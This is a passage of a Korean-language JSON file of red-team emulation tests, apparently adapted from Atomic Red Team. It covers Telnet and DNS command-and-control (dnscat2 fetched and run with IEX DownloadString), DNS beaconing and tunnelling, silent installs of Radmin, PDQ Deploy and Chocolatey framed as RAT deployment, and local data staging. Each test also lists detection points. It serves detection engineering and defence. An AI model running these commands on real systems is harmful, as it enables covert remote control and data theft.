        "6) 실제 운영망에서는 보안 정책에 위배될 수 있으므로, 반드시 격리된 실험용 네트워크/VM 환경에서 수행해야 한다."
      ],

      "procedure": [
        "1) C2 서버 준비",
        "   - 별도의 서버(또는 동일 호스트의 다른 세션)에서 Telnet C2 서버 프로그램 `telnet_server.exe`를 실행한다.",
        "   - 서버는 지정한 IP(또는 호스트명)와 포트(기본값 23)에서 클라이언트 연결을 수신할 수 있어야 한다.",
        "",
        "2) 클라이언트 측 연결 전 네트워크 확인",
        "   - Windows 클라이언트에서 PowerShell을 관리자 혹은 일반 사용자 권한으로 실행한다.",
        "   - 아래와 같이 C2 서버에 대한 TCP 연결 가능 여부를 사전에 확인할 수 있다.",
        "     `Test-NetConnection -ComputerName <server_ip> -Port <server_port>`",
        "   - `TcpTestSucceeded : True` 이면 연결 가능, False이면 방화벽/라우팅/서버 미기동 등의 문제를 의미한다.",
        "",
        "3) Telnet C2 클라이언트 실행",
        "   - Atomic 정의의 main 실행 명령은 다음과 같다.",
        "     `#{client_path} #{server_ip} --port #{server_port}`",
        "   - 예시:",
        "     `PathToAtomicsFolder\\T1071\\bin\\telnet_client.exe 192.168.0.10 --port 23`",
        "   - 이 명령 실행 시 클라이언트는 지정된 IP와 포트로 Telnet 세션을 수립하려 시도한다.",
        "",
        "4) C2 동작 관찰",
        "   - 서버 측 콘솔(또는 로그)에서 클라이언트 접속 이벤트를 확인할 수 있다.",
        "   - 일부 PoC C2 구현체는 접속 후 단순 쉘 명령 수행, banner 출력, ping/pong keep-alive 등 기본적인 상호작용을 제공한다.",
        "   - 네트워크 관점에서는 23/TCP(또는 설정한 포트)로의 세션 생성, 지속적인 양방향 데이터 교환 패턴이 관찰된다.",
        "",
        "5) 탐지/포렌식 관점 정리",
        "   - 비정상적인 Telnet(23/TCP) 아웃바운드 세션이 발생하는지 FW/Proxy/IDS에서 모니터링할 수 있다.",
        "   - 엔드포인트에서 `telnet_client.exe`와 같은 의심스러운 이진 실행, 그리고 특정 외부 IP로의 지속적인 TCP 세션 패턴을 탐지 룰로 정의할 수 있다.",
        "   - Windows 방화벽 로그, Sysmon(NetworkConnect 이벤트), 프록시 로그, 패킷 캡처(TCP 스트림) 등을 통해 C2 패턴(주기적 명령 요청/응답)을 분석할 수 있다.",
        "",
        "6) 테스트 종료 및 정리",
        "   - 클라이언트에서 telnet_client 프로세스를 종료한다.",
        "   - 서버 측 telnet_server 프로세스도 종료하여 포트를 해제한다.",
        "   - 필요 시, 실험용 바이너리 및 설정 파일을 삭제하거나 격리된 디렉터리에 보관한다."
      ],

      "dependencies": [
        {
          "executor": "powershell",
          "description": "C2 서버 IP/포트에 대한 TCP 연결 가능 여부 확인",
          "check_command": "$connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}\r\nif ($connection.TcpTestSucceeded) {exit 0} else {exit 1}",
          "manual_setup_note": "C2 서버(telnet_server.exe) 기동은 자동화되지 않으며, `PathToAtomicsFolder\\T1071\\bin\\telnet_server.exe`를 지정한 IP/포트에서 수동으로 실행해야 한다."
        }
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "#{client_path} #{server_ip} --port #{server_port}"
        }
      ],

      "cleanup": [
        "1) 클라이언트 측에서 telnet_client.exe 프로세스를 종료한다.",
        "2) 서버 측에서 telnet_server.exe 프로세스를 종료해 C2 리스닝 포트를 닫는다.",
        "3) 테스트용으로 사용한 바이너리, 설정 파일, 캡처 파일 등을 정리하거나 격리된 연구 디렉터리로 이동한다.",
        "4) 방화벽/IDS 룰을 테스트용으로 변경했을 경우, 원래 정책으로 되돌린다."
      ]
    }
  ]
},
{
  "technique_id": "T1071.004",
  "technique_name": "Application Layer Protocol: DNS",
  "tactic": "Command and Control",
  "description": "공격자는 DNS 쿼리를 이용해 C2 통신 또는 데이터 유출(DNS 터널링)을 수행할 수 있다. 특히 TXT 쿼리·임의 서브도메인·비정상적인 쿼리 빈도나 길이를 활용해, 정상 DNS 트래픽에 섞여 은밀하게 명령 전달/데이터 전송을 수행한다.",

  "tests": [
    {
      "test_id": "1700f5d6-5a44-487b-84de-bc66f507b0a6",
      "name": "DNS Large Query Volume",
      "platforms": ["windows"],
      "summary": "단일 호스트에서 대량의 DNS 쿼리를 전송해, ‘쿼리 건수 기반’ 탐지(Threshold 기반) 룰이 제대로 동작하는지 확인하는 시뮬레이션.",

      "prerequisites": [
        "1) Windows PowerShell 사용 가능해야 함.",
        "2) 테스트에 사용할 도메인(# {domain})과 서브도메인(# {subdomain})을 미리 정해야 함.",
        "3) 대량의 쿼리를 보내더라도 문제 없는 ‘테스트용 도메인’을 사용하는 것이 안전함 (예: 127.0.0.1.nip.io 는 로컬호스트로 매핑됨).",
        "4) 사내 DNS 인프라/보안장비에 부하를 줄 수 있으므로, 필히 격리된 실험 환경에서 수행할 것."
      ],

      "procedure": [
        "1) 파라미터 설정",
        "   - query_type: 기본값 TXT (DNS 터널링에서 자주 쓰는 타입)",
        "   - subdomain: 예) atomicredteam",
        "   - query_volume: 기본 1000 (0~1000까지 쿼리 총 1001회)",
        "   - domain: 예) 127.0.0.1.nip.io",
        "",
        "2) PowerShell에서 아래 명령 실행",
        "   `for($i=0; $i -le #{query_volume}; $i++) {",
        "        Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout",
        "    }`",
        "",
        "3) 동작 방식",
        "   - 매 쿼리마다 랜덤 숫자를 붙인 서브도메인(atomicredteam-123456.example.com 형태)을 생성.",
        "   - 각각에 대해 TXT 타입 DNS 조회를 수행.",
        "   - 결과적으로, 짧은 시간에 매우 많은 ‘서로 다른 FQDN’ 쿼리가 발생함.",
        "",
        "4) 포렌식/탐지 포인트",
        "   - 단일 클라이언트 → 특정 도메인으로의 비정상적으로 높은 DNS 쿼리 횟수.",
        "   - label 패턴이 `고정 prefix + 랜덤 문자열` 형태로 반복되는 도메인.",
        "   - TXT 쿼리 비율이 비정상적으로 높은 호스트/프로세스.",
        "   - DNS 로그(Windows DNS Server, 내부 DNS, 보안 DNS, DoH Proxy 등)에서 같은 특징을 가진 패턴을 룰로 잡을 수 있음.",
        "",
        "5) 테스트 종료 후",
        "   - 별도의 cleanup 명령은 없음 (DNS 쿼리는 흔적만 남고 리소스는 없음).",
        "   - 대신 DNS 서버 로그, FW/IDS 로그 등을 수집하여 쿼리 빈도·패턴 기반 탐지 룰을 검증하면 됨."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout }"
        }
      ]
    },

    {
      "test_id": "3efc144e-1af8-46bb-8ca2-1376bb6db8b6",
      "name": "DNS Regular Beaconing",
      "platforms": ["windows"],
      "summary": "지속적으로 일정(또는 약간 변형된) 간격으로 DNS 쿼리를 보내는 C2 비콘 패턴을 시뮬레이션. ‘저빈도 장기형 C2’ 탐지 실험용.",

      "prerequisites": [
        "1) Windows 환경에서 PowerShell 실행 가능해야 함.",
        "2) Atomic Red Team 스크립트 `T1071.004\\src\\T1071-dns-beacon.ps1` 파일이 존재해야 함.",
        "3) 런타임(runtime) 동안 해당 시스템이 인터넷/테스트 DNS 도메인에 접근 가능해야 함.",
        "4) 장시간 실행(기본 30분)될 수 있으므로, 실험 시간·환경을 고려해야 함."
      ],

      "procedure": [
        "1) 파라미터 의미",
        "   - runtime: 전체 시뮬레이션 시간(분 단위, 기본 30분).",
        "   - domain: C2 도메인 (예: 127.0.0.1.nip.io).",
        "   - subdomain: 기본 atomicredteam.",
        "   - query_type: 기본 TXT.",
        "   - c2_interval: 기본 30초 간격.",
        "   - c2_jitter: 기본 20% (±20% 랜덤 지터로 간격 변동).",
        "",
        "2) PowerShell에서 작업 디렉토리 변경",
        "   `Set-Location \"PathToAtomicsFolder\"`",
        "",
        "3) 비콘 스크립트 실행",
        "   `./T1071.004/src/T1071-dns-beacon.ps1 \\",
        "      -Domain #{domain} -Subdomain #{subdomain} \\",
        "      -QueryType #{query_type} -C2Interval #{c2_interval} \\",
        "      -C2Jitter #{c2_jitter} -RunTime #{runtime}`",
        "",
        "4) 동작 방식",
        "   - runtime 동안 일정 주기로 DNS 쿼리를 전송.",
        "   - C2Interval ± Jitter를 적용해, 완전히 고정된 주기가 아닌 ‘살짝 흔들리는’ 주기 패턴을 만든다.",
        "   - 실제 공격에서 흔한 ‘주기적 beaconing + 약간의 랜덤성’ 행태를 재현.",
        "",
        "5) 포렌식/탐지 포인트",
        "   - 단일 호스트(또는 프로세스)에서 특정 도메인으로 일정/유사한 간격의 DNS 쿼리 시퀀스.",
        "   - N분 동안 일정 횟수 이상, 간격 표준편차가 작은 패턴.",
        "   - 쿼리 타입(TXT), 도메인 레이블 구조, 질의 실패/성공 비율 등과 결합하여 C2 의심 세션을 스코어링.",
        "",
        "6) 종료",
        "   - runtime이 지나면 스크립트가 자동 종료.",
        "   - 필요 시 PowerShell 프로세스를 수동으로 종료할 수 있음."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Set-Location \"PathToAtomicsFolder\"; .\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}"
        }
      ]
    },

    {
      "test_id": "fef31710-223a-40ee-8462-a396d6b66978",
      "name": "DNS Long Domain Query",
      "platforms": ["windows"],
      "summary": "도메인 이름 길이를 점점 늘려가며 DNS 쿼리를 보내, ‘비정상적으로 긴 도메인 이름’ 기반 탐지 룰을 검증하는 시뮬레이션.",

      "prerequisites": [
        "1) PowerShell 실행 환경.",
        "2) `T1071.004\\src\\T1071-dns-domain-length.ps1` 스크립트가 존재해야 함.",
        "3) 테스트용 도메인/서브도메인을 설계해야 함. 기본 서브도메인은 63자(단일 라벨 최대 길이)로 설정되어 있음.",
        "4) DNS 서버 또는 외부 네트워크로의 접근이 가능해야 하며, 길이가 긴 쿼리가 인프라에 큰 영향을 주지 않는 환경이어야 함."
      ],

      "procedure": [
        "1) 파라미터",
        "   - query_type: TXT (기본값).",
        "   - subdomain: 63자짜리 고정 문자열(atomicredteamatomicredteamatomicredteamatomicredteamatomicredte).",
        "   - domain: 예) 127.0.0.1.nip.io.",
        "",
        "2) PowerShell에서 작업 경로 변경",
        "   `Set-Location \"PathToAtomicsFolder\"`",
        "",
        "3) 길이 증가 테스트 실행",
        "   `./T1071.004/src/T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}`",
        "",
        "4) 동작 방식",
        "   - 스크립트는 지정된 서브도메인/도메인을 기반으로 도메인 전체 길이를 단계별로 늘려가며 DNS 쿼리를 전송.",
        "   - 최종적으로 RFC에서 허용하는 ‘FQDN 최대 길이’(보통 253자 내외)에 근접한 도메선까지 쿼리를 시도.",
        "",
        "5) 포렌식/탐지 포인트",
        "   - 비정상적으로 긴 도메인 또는 라벨(특히 base32/base64 패턴처럼 보이는 문자열)의 반복.",
        "   - DNS 로그에서 request length, label length 분포를 기반으로 outlier 탐지.",
        "   - DNS 터널링·DGA 기반 악성 행위에서 자주 나타나는 특징이므로, ‘도메인 길이 + 쿼리 타입 + 도메인 패턴’을 조합한 룰 설계에 활용 가능."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Set-Location \"PathToAtomicsFolder\"; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}"
        }
      ]
    },

    {
      "test_id": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7",
      "name": "DNS C2 (dnscat2)",
      "platforms": ["windows"],
      "summary": "dnscat2 기반 DNS C2 세션을 실제로 만들어보는 테스트. 도메인/서버 IP를 미리 구성해 둔 상태에서 PowerShell 버전 dnscat2 클라이언트를 실행한다.",

      "prerequisites": [
        "1) dnscat2 서버(C2 리스너) 구축",
        "   - 별도의 서버(리눅스 등)에 dnscat2 서버를 설치·실행하고, 특정 DNS 도메인을 해당 서버로 NS 레코드를 설정해야 한다.",
        "   - 예: `example.com` 도메인의 NS를 dnscat2 서버 IP로 지정.",
        "",
        "2) Windows 클라이언트 측 요구사항",
        "   - 인터넷 또는 dnscat2 DNS 서버에 접근 가능한 네트워크 경로.",
        "   - PowerShell에서 스크립트 다운로드 및 실행이 허용되어야 함 (프록시/AV 정책에 차단되지 않아야 함).",
        "",
        "3) 보안/윤리",
        "   - 실제 운영 도메인/운영망에서 수행 시 심각한 보안 위협으로 간주될 수 있으므로, 반드시 폐쇄·실습 전용 환경에서만 수행.",
        "   - DNS 로그/보안 솔루션 테스트 목적 이외로 사용하지 말 것."
      ],

      "procedure": [
        "1) 파라미터 설정",
        "   - domain: dnscat2 C2용으로 설정한 도메인 (예: c2.example.com).",
        "   - server_ip: dnscat2 DNS 서버 IP (예: 10.0.0.10).",
        "",
        "2) PowerShell에서 dnscat2 클라이언트 스크립트 로드",
        "   `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')`",
        "   - 원격 GitHub에서 PowerShell 버전 dnscat2 함수를 다운로드 후, 현재 세션에 로드.",
        "",
        "3) DNS C2 세션 시작",
        "   `Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}`",
        "   - 클라이언트는 지정된 DNS 서버로 쿼리를 전송하며, dnscat2 프로토콜로 C2 세션을 수립.",
        "   - 서버 측 dnscat2 콘솔에서 새로운 세션이 생성되고, 명령 실행·파일 전송 등 기능을 사용할 수 있음.",
        "",
        "4) 포렌식/탐지 포인트",
        "   - 특정 도메인으로 지속적인 TXT/NULL/특정 타입 쿼리가 발생.",
        "   - 전형적인 DNS 터널링 패턴:",
        "     · 서브도메인 부분에 base32/base64와 유사한 엔코딩 문자열 반복.",
        "     · 짧은 간격의 다수 TXT 쿼리.",
        "   - 엔드포인트 측에서 PowerShell의 원격 스크립트 다운로드 + 의심 함수명(Start-Dnscat2 등) 호출 로그.",
        "   - DNS 서버/보안 솔루션에서 dnscat2 시그니처 또는 트래픽 패턴 탐지.",
        "",
        "5) 종료",
        "   - 서버 콘솔에서 세션 종료 명령 수행 또는 클라이언트에서 PowerShell 세션 종료.",
        "   - 테스트 후, 관련 스크립트/파일 및 DNS 레코드(NS 설정)를 원 상태로 복구."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1072",
  "technique_name": "Software Deployment Tools",
  "tactic": "Lateral Movement",
  "description": "공격자는 Radmin, PDQ Deploy, Chocolatey 같은 소프트웨어 배포/원격 관리 도구를 악용해 다수의 시스템에 악성 도구(RAT, 백도어 등)를 일괄 설치하거나 원격 제어를 수행할 수 있다. 정상적인 관리 도구이기 때문에, 단순 실행 여부만으로는 탐지가 어렵고 사용 맥락·시간·배포 대상 등을 종합 분석해야 한다.",

  "tests": [
    {
      "test_id": "b4988cad-6ed2-434d-ace5-ea2670782129",
      "name": "Radmin Viewer Utility 실행",
      "platforms": ["windows"],
      "summary": "Radmin Viewer(원격 제어 도구)를 설치하고 콘솔을 실행한다. 공격자가 합법적인 원격 관리 도구를 C2/원격 제어 채널로 악용하는 상황을 모사한다.",

      "prerequisites": [
        "1) 인터넷 연결 필요 (공식 사이트에서 Radmin MSI 다운로드).",
        "2) PowerShell에서 `Invoke-WebRequest`, `Start-Process` 사용 가능해야 함.",
        "3) 관리자 권한이 있어야 MSI 설치 및 프로그램 실행이 원활함.",
        "4) 설치 경로는 기본적으로 `%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe` 로 가정."
      ],

      "procedure": [
        "1) Radmin 설치 여부 확인 (PowerShell, prereq_command)",
        "   - `${env:ProgramFiles(x86)}/Radmin Viewer 3/Radmin.exe` 경로에 실행 파일 존재 여부 확인.",
        "   - 존재하면 바로 테스트 실행 가능, 없으면 설치 단계로 이동.",
        "",
        "2) Radmin 설치 (get_prereq_command)",
        "   - 작업용 폴더 생성: `PathToAtomicsFolder\\..\\ExternalPayloads\\`",
        "   - Radmin Viewer MSI 다운로드:",
        "       `Invoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\"`",
        "   - MSI를 무인설치(/qn)로 실행:",
        "       `Start-Process msiexec -Wait -ArgumentList /i , \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\", /qn`",
        "",
        "3) Radmin 콘솔 실행 (executor)",
        "   - 명령 프롬프트에서:",
        "       `\"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\"`",
        "   - 실행 시 Radmin Viewer GUI가 뜨며, 원격 호스트 추가/접속 메뉴를 통한 원격 제어가 가능.",
        "",
        "4) 포렌식/탐지 포인트",
        "   - 신규 Radmin 설치 흔적: MSI 설치 로그, Program Files(x86) 내 Radmin 폴더 생성.",
        "   - 비업무 시간대 또는 비인가 단말에서의 Radmin 실행.",
        "   - Radmin 프로세스(radmin.exe)와 외부로의 RDP/전용 포트 통신(포트 4899 등) 발생 여부.",
        "   - ‘Radmin Viewer 3’가 기존 자산 관리 리스트에 없는데 갑자기 등장하는 경우."
      ],

      "commands": [
        {
          "executor": "powershell (prereq)",
          "elevation_required": true,
          "command": "if (Test-Path \"${env:ProgramFiles(x86)}/Radmin Viewer 3/Radmin.exe\") {exit 0} else {exit 1}"
        },
        {
          "executor": "powershell (get_prereq)",
          "elevation_required": true,
          "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\"; Start-Process msiexec -Wait -ArgumentList /i , \"PathToAtomicsFolder\\..\\ExternalPayloads\\RadminViewer.msi\", /qn"
        },
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe\""
        }
      ]
    },

    {
      "test_id": "e447b83b-a698-4feb-bed1-a7aaf45c3443",
      "name": "PDQ Deploy 콘솔 실행 (RAT 배포용 시나리오)",
      "platforms": ["windows"],
      "summary": "PDQ Deploy(소프트웨어 일괄 배포 도구)를 설치하고 콘솔을 실행한다. 공격자가 PDQ를 악용해 여러 호스트에 원격 관리 도구(RAT)를 배포하는 초기 단계를 재현.",

      "prerequisites": [
        "1) 인터넷 연결 필요(PDQ Deploy 설치 파일 다운로드).",
        "2) PowerShell에서 파일 다운로드·프로세스 실행 가능.",
        "3) 관리자 권한 필요 (소프트웨어 설치 및 서비스 등록 등).",
        "4) 설치 경로는 기본적으로 `%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe` 로 가정."
      ],

      "procedure": [
        "1) PDQ Deploy 설치 여부 확인 (prereq_command)",
        "   - `${env:ProgramFiles(x86)}/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe` 존재 확인.",
        "   - 없으면 설치 단계 수행.",
        "",
        "2) PDQ Deploy 설치 (get_prereq_command)",
        "   - ExternalPayloads 폴더 생성:",
        "       `New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force`",
        "   - 설치 파일 다운로드:",
        "       `Invoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\"`",
        "   - 무인 설치 실행:",
        "       `Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\" -Wait -ArgumentList \"/s\"`",
        "",
        "3) PDQ 콘솔 실행 (executor)",
        "   - 명령 프롬프트에서:",
        "       `\"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\"`",
        "   - 콘솔이 뜨면, 패키지 생성 → 배포 대상(AD, IP 범위 등) 설정 → SW 또는 스크립트(예: RAT)를 여러 호스트에 한 번에 푸시 가능.",
        "",
        "4) 포렌식/탐지 포인트",
        "   - PDQ Deploy 신규 설치 흔적 (프로그램 경로, 서비스, 레지스트리).",
        "   - 콘솔 실행 계정이 일반 사용자/비인가 계정인지 여부.",
        "   - PDQ가 단기간에 대량의 SMB/WMI/WinRM 연결을 생성하며 EXE·스크립트를 푸시하는 패턴.",
        "   - 배포된 패키지 내용에 비정상적인 EXE, PowerShell 스크립트, RAT 도구가 포함되어 있는지."
      ],

      "commands": [
        {
          "executor": "powershell (prereq)",
          "elevation_required": true,
          "command": "if (Test-Path \"${env:ProgramFiles(x86)}/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\") {exit 0} else {exit 1}"
        },
        {
          "executor": "powershell (get_prereq)",
          "elevation_required": true,
          "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\"; Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\PDQDeploysetup.exe\" -Wait -ArgumentList \"/s\""
        },
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "\"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\""
        }
      ]
    },

    {
      "test_id": "2169e8b0-2ee7-44cb-8a6e-d816a5db7d8a",
      "name": "Chocolatey를 통한 7-Zip 배포",
      "platforms": ["windows"],
      "summary": "패키지 매니저 Chocolatey를 이용해 7-Zip을 설치한다. 실제 공격에서는 이를 악용해 7-Zip 대신 악성 도구를 다수 시스템에 일괄 배포할 수 있다.",

      "prerequisites": [
        "1) 대상 시스템에 Chocolatey 설치 필요 (choco.exe 존재).",
        "2) Chocolatey 설치 자체도 스크립트로 이루어지므로, 설치 로그/PowerShell 이력도 함께 관찰해야 함.",
        "3) 인터넷 접속(공식 리포지터리 또는 내부 Chocolatey 리포지터리).",
        "4) 일부 환경에서는 choco install에 관리자 권한이 필요할 수 있음."
      ],

      "procedure": [
        "1) Chocolatey 설치 여부 확인 (prereq_command)",
        "   - `${env:ProgramFiles(x86)}\\Chocolatey\\choco.exe` 경로 체크.",
        "   - 없으면 설치 단계 수행.",
        "",
        "2) Chocolatey 설치 (get_prereq_command)",
        "   - 설치 스크립트 다운로드:",
        "       `Invoke-WebRequest -Uri \"https://chocolatey.org/install.ps1\" -OutFile \"chocolatey-install.ps1\"`",
        "   - Bypass 정책으로 PowerShell 스크립트 실행:",
        "       `Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1\" -Wait`",
        "",
        "3) 7-Zip 배포 (executor)",
        "   - PowerShell에서:",
        "       `choco install -y 7zip`",
        "   - 이 과정이 실제로는 네트워크 상의 여러 노드에서 동시에 수행될 수 있으며, 공격자는 이 메커니즘을 활용해 악성 패키지를 설치할 수 있음.",
        "",
        "4) 포렌식/탐지 포인트",
        "   - Chocolatey 설치 흔적 (폴더, 레지스트리, PATH 변경).",
        "   - choco 명령 호출 로그 (PowerShell 로그, Sysmon 이벤트 등).",
        "   - choco를 통해 설치되는 패키지가 표준 SW인지, 내부에서 승인된 리스트인지 여부.",
        "   - 단기간에 여러 서버/클라이언트에서 동일한 choco 명령이 반복되는 경우 (배포형 악용)."
      ],

      "commands": [
        {
          "executor": "powershell (prereq)",
          "elevation_required": false,
          "command": "if (Test-Path \"${env:ProgramFiles(x86)}\\Chocolatey\\choco.exe\") {exit 0} else {exit 1}"
        },
        {
          "executor": "powershell (get_prereq)",
          "elevation_required": true,
          "command": "Invoke-WebRequest -Uri \"https://chocolatey.org/install.ps1\" -OutFile \"chocolatey-install.ps1\"; Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1\" -Wait"
        },
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "choco install -y 7zip"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1074.001",
  "technique_name": "Data Staged: Local Data Staging",
  "tactic": "Collection",
  "description": "공격자는 수집한 정보를 바로 외부로 내보내지 않고, 먼저 로컬 특정 디렉터리(예: Temp, 사용자 프로필 하위 폴더 등)에 모아두는 ‘스테이징(Staging)’ 단계를 거친다. 이렇게 모인 데이터는 이후 ZIP 등으로 압축·암호화된 뒤, 별도의 전송 기법(HTTP, DNS, 클라우드 동기화 등)을 통해 유출된다. 이 기법은 흔히 정찰 스크립트, 수집 스크립트, 결과 로그 파일 등을 임시 위치에 모아두는 형태로 나타난다.",

  "tests": [
    {
      "test_id": "107706a5-6f9f-451a-adae-bab8c667829f",
      "name": "Discovery.bat 다운로드 후 로컬 스테이징",
      "platforms": ["windows"],
      "summary": "PowerShell Invoke-WebRequest로 원격 GitHub에서 discovery.bat를 다운로드하여 %TEMP% 경로에 저장한다. 이는 공격자가 정보 수집용 배치 스크립트를 먼저 호스트에 내려받아 스테이징하는 행위를 모사한다.",

      "prerequisites": [
        "1) 인터넷 연결 필요 (GitHub raw 콘텐츠에 접근 가능해야 함).",
        "2) PowerShell 실행 가능하고, `Invoke-WebRequest` 사용이 차단되어 있지 않을 것.",
        "3) 현재 사용자 계정에 %TEMP% 디렉터리에 쓰기 권한이 있어야 함.",
        "4) 프록시/보안 솔루션이 githubusercontent.com 접속을 전면 차단하지 않을 것."
      ],

      "procedure": [
        "1) 스테이징 대상 경로 결정",
        "   - 기본값: `$env:TEMP\\discovery.bat`",
        "   - 필요 시 다른 임시 폴더나 사용자 지정 경로로 변경 가능.",
        "",
        "2) PowerShell을 통해 도구 다운로드 (실제 공격 모사)",
        "   - GitHub Atomic Red Team 리포지터리에서 Discovery.bat를 가져와 로컬에 저장:",
        "       `Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat`",
        "",
        "3) 스테이징 결과 확인",
        "   - 파일 존재 여부:",
        "       `Test-Path $env:TEMP\\discovery.bat`",
        "   - 탐지 관점에서는 ‘임시 폴더에 새 배치 파일 생성’ + ‘외부 GitHub 도메인에서 단일 스크립트 다운로드’ 패턴을 함께 보는 것이 중요.",
        "",
        "4) 포렌식/탐지 포인트",
        "   - PowerShell Operational 로그(4688/4104 등)에서 Invoke-WebRequest → 외부 도메인 호출 흔적.",
        "   - %TEMP% 경로에 새롭게 생성된 .bat 파일(특히 이름이 generic한 discovery, collect, info 같은 경우).",
        "   - 동일 호스트에서 다른 정찰/수집 스크립트와 함께 반복적으로 다운로드되는 패턴.",
        "   - EDR/AV에서 ‘스크립트 다운로드 후 즉시 실행’ 체인을 T1074.001 + T1059 (Command/Scripting Interpreter) 조합으로 태깅 가능."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat"
        },
        {
          "executor": "powershell (cleanup)",
          "elevation_required": false,
          "command": "Remove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "a57fbe4b-3440-452a-88a7-943531ac872a",
      "name": "PowerShell로 폴더 ZIP 압축 후 Temp에 스테이징",
      "platforms": ["windows"],
      "summary": "PowerShell Compress-Archive를 사용하여 특정 폴더(또는 파일 집합)를 ZIP 파일로 압축하고 %TEMP%에 저장한다. 이는 공격자가 유출 전 데이터를 한 번에 보내기 위해 로컬에서 압축·정리하는 전형적인 스테이징 패턴이다.",

      "prerequisites": [
        "1) PowerShell 5+ 환경 (Compress-Archive cmdlet 포함).",
        "2) 압축 대상 폴더(또는 파일)가 실제로 존재해야 함 (기본: `PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip`).",
        "3) %TEMP% 디렉터리에 쓰기 권한 필요.",
        "4) 파일 잠금, AV에 의한 실시간 검사로 인해 압축이 실패하지 않을 것."
      ],

      "procedure": [
        "1) 입력/출력 경로 정의",
        "   - 입력(스테이징 대상): `PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip`",
        "   - 출력(스테이징 ZIP 파일): `$env:TEMP\\Folder_to_zip.zip`",
        "",
        "2) 테스트용 폴더 준비 (선택적으로 선행)",
        "   - 실제 환경에서는 공격자가 사용자 문서 폴더, 브라우저 프로파일, DB 파일 등을 타겟으로 선택.",
        "   - Atomic 환경에서는 미리 준비된 샘플 폴더를 사용.",
        "",
        "3) PowerShell로 ZIP 압축 수행",
        "   - 명령 예:",
        "       `Compress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force`",
        "   - `-Force` 옵션으로 기존 ZIP 파일이 있더라도 덮어씀.",
        "",
        "4) 스테이징 결과 확인",
